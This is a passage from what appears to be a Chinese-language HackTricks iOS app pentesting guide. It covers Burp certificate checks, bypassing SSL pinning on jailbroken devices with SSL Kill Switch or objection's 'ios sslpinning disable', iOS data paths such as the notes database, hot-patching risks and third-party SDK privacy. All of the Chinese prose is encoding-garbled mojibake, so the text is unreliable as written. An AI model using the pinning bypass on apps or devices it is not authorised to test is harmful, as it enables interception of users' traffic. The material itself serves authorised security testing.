ä¸ºäº†ä½¿ç”¨Burpæ£€æŸ¥æ­¤é—®é¢˜ï¼Œåœ¨ä¿¡ä»»äº†iPhoneä¸Šçš„Burp CAä¹‹åï¼Œæ‚¨å¯ä»¥**ä½¿ç”¨Burpä¸ºä¸åŒçš„ä¸»æœºååˆ›å»ºä¸€ä¸ªæ–°çš„è¯ä¹¦**å¹¶ä½¿ç”¨å®ƒã€‚å¦‚æœåº”ç”¨ç¨‹åºä»ç„¶æ­£å¸¸å·¥ä½œï¼Œåˆ™è¡¨ç¤ºå­˜åœ¨æ¼æ´ã€‚

### è¯ä¹¦å›ºå®š

å¦‚æœåº”ç”¨ç¨‹åºæ­£ç¡®ä½¿ç”¨SSLå›ºå®šï¼Œåˆ™åªæœ‰åœ¨è¯ä¹¦ç¬¦åˆé¢„æœŸæ—¶åº”ç”¨ç¨‹åºæ‰èƒ½æ­£å¸¸å·¥ä½œã€‚åœ¨æµ‹è¯•åº”ç”¨ç¨‹åºæ—¶ï¼Œ**è¿™å¯èƒ½æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºBurpå°†æä¾›è‡ªå·±çš„è¯ä¹¦**ã€‚\
ä¸ºäº†åœ¨è¶Šç‹±è®¾å¤‡ä¸­ç»•è¿‡æ­¤ä¿æŠ¤ï¼Œæ‚¨å¯ä»¥å®‰è£…åº”ç”¨ç¨‹åº[**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2)æˆ–å®‰è£…[**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)ã€‚

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**objectionçš„** `ios sslpinning disable`

## æ‚é¡¹

* åœ¨**`/System/Library`**ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æ‰‹æœºä¸Šç³»ç»Ÿåº”ç”¨ç¨‹åºä½¿ç”¨çš„æ¡†æ¶
* ç”¨æˆ·ä»App Storeå®‰è£…çš„åº”ç”¨ç¨‹åºä½äº**`/User/Applications`**ä¸­
* **`/User/Library`**åŒ…å«ç”¨æˆ·çº§åº”ç”¨ç¨‹åºä¿å­˜çš„æ•°æ®
* æ‚¨å¯ä»¥è®¿é—®**`/User/Library/Notes/notes.sqlite`**ä»¥è¯»å–åº”ç”¨ç¨‹åºä¸­ä¿å­˜çš„ç¬”è®°ã€‚
* åœ¨å·²å®‰è£…åº”ç”¨ç¨‹åºçš„æ–‡ä»¶å¤¹ä¸­ï¼ˆ**`/User/Applications/<APP ID>/`**ï¼‰ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€äº›æœ‰è¶£çš„æ–‡ä»¶ï¼š
* **`iTunesArtwork`**ï¼šåº”ç”¨ç¨‹åºä½¿ç”¨çš„å›¾æ ‡
* **`iTunesMetadata.plist`**ï¼šåœ¨App Storeä¸­ä½¿ç”¨çš„åº”ç”¨ç¨‹åºä¿¡æ¯
* **`/Library/*`**ï¼šåŒ…å«é¦–é€‰é¡¹å’Œç¼“å­˜ã€‚åœ¨**`/Library/Cache/Snapshots/*`**ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å°†åº”ç”¨ç¨‹åºå‘é€åˆ°åå°ä¹‹å‰æ‰§è¡Œçš„å¿«ç…§ã€‚

### çƒ­ä¿®è¡¥/å¼ºåˆ¶æ›´æ–°

å¼€å‘äººå‘˜å¯ä»¥è¿œç¨‹**å³æ—¶ä¿®è¡¥å…¶åº”ç”¨ç¨‹åºçš„æ‰€æœ‰å®‰è£…**ï¼Œè€Œæ— éœ€é‡æ–°æäº¤åº”ç”¨ç¨‹åºåˆ°App Storeå¹¶ç­‰å¾…å…¶è·å¾—æ‰¹å‡†ã€‚\
ä¸ºæ­¤ï¼Œé€šå¸¸ä½¿ç”¨[**JSPatch**](https://github.com/bang590/JSPatch)**ã€‚**ä½†ä¹Ÿæœ‰å…¶ä»–é€‰æ‹©ï¼Œå¦‚[Siren](https://github.com/ArtSabintsev/Siren)å’Œ[react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker)ã€‚\
**è¿™æ˜¯ä¸€ç§å±é™©çš„æœºåˆ¶ï¼Œå¯èƒ½ä¼šè¢«æ¶æ„çš„ç¬¬ä¸‰æ–¹SDKæ»¥ç”¨ï¼Œå› æ­¤å»ºè®®æ£€æŸ¥ä½¿ç”¨å“ªç§æ–¹æ³•è¿›è¡Œè‡ªåŠ¨æ›´æ–°ï¼ˆå¦‚æœæœ‰ï¼‰å¹¶è¿›è¡Œæµ‹è¯•ã€‚**æ‚¨å¯ä»¥å°è¯•ä¸‹è½½åº”ç”¨ç¨‹åºçš„æ—©æœŸç‰ˆæœ¬ä»¥è¿›è¡Œæ­¤ç›®çš„ã€‚

### ç¬¬ä¸‰æ–¹

ç¬¬ä¸‰æ–¹SDKçš„ä¸€ä¸ªé—®é¢˜æ˜¯å¯¹SDKæä¾›çš„åŠŸèƒ½**æ²¡æœ‰ç»†ç²’åº¦çš„æ§åˆ¶**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨SDKå¹¶æ‹¥æœ‰æ‰€æœ‰åŠŸèƒ½ï¼ˆåŒ…æ‹¬è¯Šæ–­æ³„æ¼å’Œä¸å®‰å…¨çš„HTTPè¿æ¥ï¼‰ï¼Œæˆ–è€…ä¸ä½¿ç”¨å®ƒã€‚æ­¤å¤–ï¼Œé€šå¸¸åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜**æ— æ³•ä¿®è¡¥SDKä¸Šçš„æ¼æ´**ã€‚\
æ­¤å¤–ï¼Œä¸€äº›SDKä¸€æ—¦è¢«ç¤¾åŒºéå¸¸ä¿¡ä»»ï¼Œå°±ä¼šå¼€å§‹**åŒ…å«æ¶æ„è½¯ä»¶**ã€‚

æ­¤å¤–ï¼Œè¿™äº›æœåŠ¡æä¾›çš„åŠŸèƒ½å¯èƒ½æ¶‰åŠ**è·Ÿè¸ªæœåŠ¡ä»¥ç›‘æ§ç”¨æˆ·åœ¨ä½¿ç”¨åº”ç”¨ç¨‹åºæ—¶çš„è¡Œä¸º**ï¼Œé”€å”®æ¨ªå¹…å¹¿å‘Šæˆ–æ”¹å–„ç”¨æˆ·ä½“éªŒã€‚ç¬¬ä¸‰æ–¹æœåŠ¡çš„ç¼ºç‚¹æ˜¯å¼€å‘äººå‘˜ä¸çŸ¥é“é€šè¿‡ç¬¬ä¸‰æ–¹åº“æ‰§è¡Œçš„ä»£ç çš„è¯¦ç»†ä¿¡æ¯ã€‚å› æ­¤ï¼Œåªåº”å‘é€å¿…è¦çš„ä¿¡æ¯ç»™æœåŠ¡ï¼Œå¹¶ä¸”ä¸åº”æŠ«éœ²æ•æ„Ÿä¿¡æ¯ã€‚

ç¼ºç‚¹æ˜¯**å¼€å‘äººå‘˜ä¸çŸ¥é“é€šè¿‡ç¬¬ä¸‰æ–¹åº“æ‰§è¡Œçš„ä»£ç çš„è¯¦ç»†ä¿¡æ¯**ï¼Œå› æ­¤æ”¾å¼ƒäº†å¯è§æ€§ã€‚å› æ­¤ï¼Œåº”ç¡®ä¿å‘æœåŠ¡å‘é€çš„ä¿¡æ¯ä¸è¶…è¿‡æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¹¶ä¸”ä¸ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

å¤§å¤šæ•°ç¬¬ä¸‰æ–¹æœåŠ¡æœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼š

* ä½¿ç”¨ç‹¬ç«‹åº“
* ä½¿ç”¨å®Œæ•´çš„SDK

å‘é€ç»™ç¬¬ä¸‰æ–¹æœåŠ¡çš„æ‰€æœ‰æ•°æ®éƒ½åº”åŒ¿ååŒ–ï¼Œä»¥é˜²æ­¢æš´éœ²å¯èƒ½ä½¿ç¬¬ä¸‰æ–¹èƒ½å¤Ÿè¯†åˆ«ç”¨æˆ·å¸æˆ·çš„PIIï¼ˆä¸ªäººå¯è¯†åˆ«ä¿¡æ¯ï¼‰ã€‚

æ‚¨å¯ä»¥é€šè¿‡å¯¹åº”ç”¨ç¨‹åºè¿è¡Œ**`otool`**æ¥æ‰¾åˆ°åº”ç”¨ç¨‹åºä½¿ç”¨çš„**åº“**ï¼ˆå¹¶å¯¹æ¯ä¸ªå…±äº«åº“è¿è¡Œå®ƒä»¥æ‰¾åˆ°æ›´å¤šä½¿ç”¨çš„å…±äº«åº“ï¼‰ã€‚

## **å‚è€ƒèµ„æ–™**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
## æ›´å¤šä¿¡æ¯

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) iOSå…è´¹è¯¾ç¨‹([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-Cç‰ˆæœ¬ [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swiftç‰ˆæœ¬
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±å…¨çƒ**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
